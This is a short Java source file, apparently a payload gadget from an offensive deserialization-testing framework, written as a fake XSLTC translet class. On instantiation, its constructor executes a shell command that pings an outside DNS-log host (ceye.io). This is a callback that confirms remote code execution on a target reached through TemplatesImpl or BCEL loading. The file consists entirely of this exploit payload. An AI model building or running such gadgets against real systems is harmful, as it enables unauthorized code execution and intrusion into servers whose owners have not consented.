package me.gv7.woodpecker.plugin.gadgets.memoryshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class bcelHelloTemplatesImpl{
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    public bcelHelloTemplatesImpl() {
        super();
        try {
            Runtime.getRuntime().exec("ping -nc 1 nmsl.0nva74.ceye.io");
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println("Hello bcelTempl");
    }
}